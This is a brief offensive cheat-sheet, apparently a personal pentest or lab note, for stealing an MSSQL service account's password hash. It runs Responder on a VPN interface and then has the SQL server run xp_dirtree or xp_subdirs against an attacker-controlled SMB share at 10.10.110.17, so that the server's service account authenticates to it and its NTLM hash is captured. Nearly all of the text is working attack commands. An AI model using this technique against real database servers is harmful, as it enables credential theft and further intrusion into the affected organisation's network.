this steals the mssql service hash.

# set up responder or impackets
```
sudo responder -I tun0
```

# execute sql query
```
EXEC master..xp_dirtree '\\10.10.110.17\share\'
GO
```
or
```
EXEC master..xp_subdirs '\\10.10.110.17\share\'
GO
```


















